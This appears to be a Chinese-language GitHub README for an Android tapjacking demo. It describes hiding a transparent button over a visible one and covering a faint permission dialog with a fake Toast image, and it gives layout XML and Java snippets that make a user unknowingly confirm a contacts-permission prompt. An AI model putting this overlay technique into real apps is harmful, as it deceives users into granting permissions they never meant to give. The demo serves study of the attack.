# Tapjacking_Android
1.	页面整体采用<RelativeLayout>相对布局，其中start按钮和premession按钮采用<FrameLyout>布局方法，将Start按钮覆盖在Premession按钮上，并设置start的透明度alpha为0.这样就使用户以为在点击Premession实际上是在触发Start
2.	点击Start，将加载一个image图像，同时触发一个模拟权限获取的提示框，并将提示框的主体背景设为透明，同时将刚刚加载的伪造消息提示的图像覆盖到权限提示框上，仅留下权限提示框的确认按钮，这样用户就误以为自己在点击信息提示的确认，其实是再点权限确认。
3.	部分核心代码
布局文件（activity_main.xml）：
    <FrameLayout
        android:layout_width="wrap_content"
        android:layout_height="wrap_content">
        <Button
            android:id="@+id/button"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            style="@style/btnStyle"
            android:text="premession"
            />
        <Button
            android:id="@+id/btnStart"
            style="@style/btnStyle"
            android:layout_width="137dp"
            android:layout_height="wrap_content"
            android:onClick="startTJService"
            android:text="@string/strStart"
            android:alpha="0"/>
</FrameLayout>

MainActivity.java：
this.startService(service);
        AlertDialog.Builder bb = new AlertDialog.Builder(this);
        bb.setPositiveButton("confrim",new DialogInterface.OnClickListener(){
            public void onClick(DialogInterface arg0,int arg1){
                Toast t = (Toast) Toast.makeText(getApplicationContext(),"你上当了!!",Toast.LENGTH_LONG);
                t.show();
                arg0.dismiss();
            }
        });
        final AlertDialog dialog = bb.create();
        WindowManager.LayoutParams lp = dialog.getWindow().getAttributes();
        lp.alpha=0.1f;
        dialog.getWindow().setAttributes(lp);
        bb.setMessage("应用Tap_jacking正在申请联系人权限");
        bb.setTitle("权限获取");
        dialog.show();

ToastService.java:
    public void onCreate() {
        super.onCreate();
        t = new Timer();
        context = getApplicationContext();
        jam = new Toast(context);
        ImageView img = new ImageView(context);
        img.setImageResource(R.drawable.ic_terms_message);//加载假的信息提示
        jam.setView(img);
    }
![image](https://github.com/ggfhgg/Tapjacking_Android/blob/master/Screenshot_20190718-113237_tapjacking_android.jpg)

